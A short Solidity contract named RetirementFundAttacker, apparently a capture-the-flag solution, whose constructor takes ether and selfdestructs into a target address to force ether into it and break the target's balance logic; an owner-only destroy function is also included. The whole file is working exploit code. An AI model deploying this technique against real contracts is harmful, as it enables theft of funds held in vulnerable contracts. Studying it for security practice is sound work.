// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

contract RetirementFundAttacker {
    address payable public owner;
	event Received(address, uint256);

    constructor (address payable target) payable {
        owner = payable(msg.sender);
        require(msg.value > 0);
        selfdestruct(target);
    }

    function destroy() public {
        require(msg.sender == owner, "Only the owner can destroy this contract");
		selfdestruct(payable(msg.sender)); 
	}

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

}